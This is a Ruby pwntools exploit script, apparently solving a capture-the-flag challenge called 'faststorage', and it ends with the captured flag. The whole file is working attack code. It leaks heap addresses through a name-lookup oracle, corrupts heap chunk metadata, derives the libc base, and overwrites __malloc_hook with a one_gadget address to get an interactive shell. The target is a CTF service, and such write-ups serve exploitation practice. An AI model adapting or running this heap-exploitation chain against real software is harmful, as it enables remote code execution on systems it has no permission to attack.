#!/usr/bin/env ruby
# encoding: ascii-8bit
require 'pry'
require 'pwn'        # https://github.com/peter50216/pwntools-ruby
require 'heapinfo'   # https://github.com/david942j/heapinfo
require 'one_gadget' # https://github.com/david942j/one_gadget
require 'securerandom'

@magic = one_gadget(file: './libc.so.6')[1]

host, port = 'faststorage.hackable.software', 1337
@local = false
if ARGV.empty?
  host = '127.0.0.1'; @local = true
else
  raise ArgumentError, 'host not set' if host.empty?
end
$z = Sock.new host, port
def z;$z;end
@p = 'faststorage'
def h;@h ||= heapinfo(@p);end
def elf; @elf ||= ELF.new(@p); end
#================= Exploit Start ====================
context.arch = 'amd64'
# context.log_level = :debug
def pt
  z.gets '> '
end

def add(name, value, val_len: nil)
  val_len = value.size if val_len.nil?
  pt
  z.puts 1
  # z.gets 'ame'
  z.write name.ljust(256, "\x00")
  # z.gets 'ize'
  z.puts val_len
  z.gets 'lue'
  z.write value
end

def edit(name, value)
  pt
  z.puts 3
  z.gets 'ame'
  z.write name.ljust(256, "\x00")
  z.write value
end

LEN = 10
def find_name(idx, bit)
  @map ||= IO.binread('map')
  @map[idx * 32 * LEN + bit * LEN, LEN]
end

def show(name)
  pt
  z.puts 2
  z.gets "ame"
  z.write name
  z.gets
end

ary = []
32.times { |i| ary << find_name(60, i); add(ary.last, 'xx') }
32.times { |i| ary << find_name(61, i); add(ary.last, 'xx') }

nice_name = "\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\x02\xF6\xB4\xE4\xCE\xA9"
# 'A' * 20
add(nice_name, 'B' * 48) # 0x80

leak = ary.map do |n|
  show(n).include?('No such') ? '0' : '1'
end
heap = leak.reverse.join.to_i(2) - 0x1880
log.dump heap.hex

add('whatever', flat(0, heap + 0x1850, (heap + 0x1958) | (0x1000 << 48)))
# add('a', 'b'*16)

# # 80 -> a0
name = find_name(60, 5)
p name
add(name, 'zz') # 80 -> a0

edit(nice_name, "\xb1\x06")

add('hack', 'A' * 0x400)

add('not important', 'A' * 0x400)

s = show(nice_name)
# p s
libc = s[0x498+16-7, 8].u64 - 0x3c4b78
h.offset libc
log.dump libc.hex

malloc_hook = 0x00000000003c4b10
forge = (libc + malloc_hook) | (8<<48)
edit(nice_name, flat('A' * (0x400 + 8 + 8), 0x21, "hack\x00\x00\x00\x00", 0, 0, 0x21, 0, heap + 0x1d70, forge))

edit('hack', flat(libc + @magic))

pt
z.puts 1
z.puts "\x00" * 256
z.puts 0

z.interact

# DrgnS{6f617344e5be892284e72c2b76ea004a}
